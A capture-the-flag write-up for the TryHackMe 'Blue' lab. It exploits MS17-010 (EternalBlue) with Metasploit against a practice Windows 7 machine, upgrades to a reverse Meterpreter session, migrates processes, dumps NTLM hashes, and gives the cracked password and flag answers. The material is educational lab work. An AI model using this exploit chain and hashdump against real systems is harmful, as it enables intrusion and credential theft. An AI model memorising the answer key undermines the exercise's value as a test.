# Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

[Blue](https://tryhackme.com/room/blue)

## Topic's

- Network Enumeration
- Metasploit (MS17-010)
- Metasploit (hashdump)
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## [Task 1] Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. **

![Ethernal Blue](https://i.imgur.com/NhZIt9S.png)

_Art by one of our members, Varg - [THM Profile](https://tryhackme.com/p/Varg) - [Instagram](https://www.instagram.com/varghalladesign/) - [Blue Merch](https://www.redbubble.com/shop/ap/53637482)_

_Link to Ice, the sequel to Blue: [Link](https://tryhackme.com/room/ice)_

_You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)_

---

_The virtual machine used in this room (Blue) can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html)_

_Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter._

1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)

```
sudo nmap -sS -sC -sV -vv --script vuln blue
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 0.00s elapsed
Initiating Ping Scan at 17:23
Scanning blue (10.10.166.97) [4 ports]
Completed Ping Scan at 17:23, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:23
Scanning blue (10.10.166.97) [1000 ports]
Discovered open port 139/tcp on 10.10.166.97
Discovered open port 135/tcp on 10.10.166.97
Discovered open port 3389/tcp on 10.10.166.97
Discovered open port 445/tcp on 10.10.166.97
Discovered open port 49158/tcp on 10.10.166.97
Discovered open port 49154/tcp on 10.10.166.97
Discovered open port 49152/tcp on 10.10.166.97
Discovered open port 49153/tcp on 10.10.166.97
Discovered open port 49160/tcp on 10.10.166.97
Completed SYN Stealth Scan at 17:23, 0.75s elapsed (1000 total ports)
Initiating Service scan at 17:23
Scanning 9 services on blue (10.10.166.97)
Service scan Timing: About 55.56% done; ETC: 17:25 (0:00:43 remaining)
Completed Service scan at 17:24, 59.35s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.166.97.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:24
NSE Timing: About 99.82% done; ETC: 17:24 (0:00:00 remaining)
Completed NSE at 17:25, 32.95s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 5.81s elapsed
Nmap scan report for blue (10.10.166.97)
Host is up, received echo-reply ttl 127 (0.041s latency).
Scanned at 2020-09-14 17:23:27 EDT for 99s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown:
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.64 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.064KB)
```

`No answer needed`

2. How many ports are open with a port number under 1000?

`3`

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

`ms17-010`

## [Task 2] Gain Access

Exploit the machine and gain a foothold.

1. Start Metasploit

`No answer needed`

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

`exploit/windows/smb/ms17_010_eternalblue`

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.166.97
RHOSTS => 10.10.166.97
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.166.97     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

`RHOSTS`

4. Run the exploit!

`No answer needed`

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

`No answer needed`

## [Task 3] Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

`post/multi/manage/shell_to_meterpreter`

2. Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)

```
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

`SESSION`

3. Set the required option, you may need to list all of the sessions to find your target here.

```
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

`No answer needed`

4. Run! If this doesn't work, try completing the exploit from the previous task once more.

```
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.106.222:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.166.97
[*] Meterpreter session 2 opened (10.8.106.222:4433 -> 10.10.166.97:49303) at 2020-09-14 17:41:50 -0400
[*] Stopping exploit/multi/handler
```

`No answer needed`

5. Once the meterpreter shell conversion completes, select that session for use.

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.106.222:4444 -> 10.10.166.97:49253 (10.10.166.97)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.8.106.222:4433 -> 10.10.166.97:49303 (10.10.166.97)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

`No answer needed`

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

```
meterpreter > shell
Process 1580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

`No answer needed`

7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1056  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1104  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1272  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1408  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1464  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1572  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1580  1684  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 1604  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1684  2920  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 1904  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2432  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2476  1272  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2532  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2576  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2596  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2624  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2768  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2920  2344  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

`No answer needed`

8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

```
meterpreter > migrate 1272
[*] Migrating from 1684 to 1272...
[*] Migration completed successfully.
```

`migrate 1272`

## [Task 4] Cracking

Dump the non-default user's password and crack it!

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

`jon`

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

`alqfna22`

## [Task 5] Find flags!

Find the three flags planted on this machine.

Completed Blue? Check out Ice: [Link](https://tryhackme.com/room/ice)

You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)

1. Flag1? (Only submit the flag contents {CONTENTS})

```
meterpreter > shell
Process 1888 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

```
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```

`access_the_machine`

2. Flag2? \*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

```
C:\Windows\system32>dir *flag*.txt /s
dir *flag*.txt /s
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\system32\config

03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)  20,438,118,400 bytes free

C:\Windows\system32>type config\flag2.txt
type config\flag2.txt
flag{sam_database_elevated_access}
```

`sam_database_elevated_access`

3. flag3?

```
C:\Windows\system32>type C:\"Documents and Settings"\Jon\Documents\flag3.txt
type C:\"Documents and Settings"\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```

`admin_documents_can_be_valuable`
